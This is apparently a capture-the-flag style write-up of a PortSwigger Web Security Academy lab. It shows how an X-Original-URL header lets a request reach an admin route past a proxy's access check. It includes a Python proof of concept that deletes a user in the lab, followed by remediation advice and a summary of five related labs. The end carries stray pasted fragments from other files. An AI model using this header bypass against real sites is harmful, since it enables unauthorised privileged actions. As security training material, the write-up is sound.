Access Control Bypass via X-Original-URL Header — Broken Access Control

Platform: PortSwigger Web Security Academy Category: Access Control Vulnerabilities Date: 2026-07-29

The Problem

The application sat behind a component (e.g. a reverse proxy or access-control layer) that only inspected the path shown in the request line (e.g. GET /) to decide whether a request was allowed through. However, the backend server that actually processes the request trusted a separate X-Original-URL header to determine which internal route to actually execute — without re-checking authorization for that route.

This created a mismatch: the security check happened on one path, while the real action happened on a completely different one.

Discovery / Exploitation
Confirm that requesting a protected admin route directly (e.g. GET /admin/delete?username=carlos) is blocked by the access control layer
Send a request to an innocuous, allowed path instead (e.g. GET /?username=carlos)
Add the header: X-Original-URL: /admin/delete
The access control layer only sees and approves the harmless path (/), but the backend reads the X-Original-URL header and treats the request as if it were sent to /admin/delete
The privileged action (deleting user carlos) executes successfully, despite never directly requesting the protected path
Impact

An attacker can reach and execute any admin-only functionality by disguising the real target route inside a header instead of the request path — completely bypassing the access control layer's checks. This is a critical vertical privilege escalation vulnerability.

Proof of Concept (Python)

This script sends a request to an allowed path while smuggling the real admin route through the X-Original-URL header, deleting a user (carlos) with no real admin privileges.

python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def delete_user(s, url):
    delete_carlos_url = url + "?username=carlos"
    headers = {"X-Original-URL": "/admin/delete"}

    r = s.get(delete_carlos_url, headers=headers, verify=False, proxies=proxies)
    res = r.text

    if "congratulations" in res.lower() or "solved" in res.lower():
        print("(+) successfully deleted carlos")
    else:
        print("(-) could not delete it")


def main():
    if len(sys.argv) != 2:
        print('(+) usage: %s <url>' % sys.argv[0])
        sys.exit()

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)


if __name__ == "__main__":
    main()

How it works:

Builds a request to the site's root path with ?username=carlos as the target of the eventual action
Adds the X-Original-URL: /admin/delete header, which the backend uses to decide the real route to execute — bypassing whatever check was applied to the visible path
Checks the response text to confirm whether the lab's success condition was met
Remediation

Access control decisions must be made by the same component that ultimately processes the request, using the actual route being executed — not a separate, client-influenceable header. If a proxy or gateway performs access control, it must either:

Strip any client-supplied X-Original-URL (or similar) headers before forwarding requests, or
Ensure the backend never trusts such headers to override routing without re-applying the same authorization checks
Takeaway

This is the fifth variation of the same underlying pattern seen across these labs — the server (or a component of it) trusts something the client controls to decide what should happen, instead of enforcing access control consistently on the actual executed route:

Lab	Where the flaw lived	How it was found
1	Predictable admin URL	Guessed directly in the browser
2	Leaked in client-side JavaScript	Viewed page source
3	A client-supplied cookie value	Intercepted and tampered with Burp
4	An unrestricted field accepted on profile update	Spotted a leaked field in a response, then replayed it in a write request
5	A client-supplied routing header (X-Original-URL)	Sent an allowed path with the header pointing to the real admin route

The consistent lesson across all five labs: access control must be enforced on the actual, final route being executed — by the component that executes it — never inferred from a URL, a script, a cookie, a form field, or a routing header supplied by the client.

Content

# Unprotected Admin Functionality with Unpredictable URL — Broken Access Control **Platform:** PortSwigger Web Security Academy **Category:** Access Control Vulnerabilities **Date:** 2026-07-26 ## The Problem The admin panel was hosted at a randomized, unguessable path (e.g. `/admin-i387r

PASTED

portswigger_labs_writeups/access-control / 04-mass-assignment-role.md in main Edit Preview Indent mode Spaces Indent size 2 Line wrap mode No wrap Editing 04-mass-assignment-role.md file contents 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16

PASTED
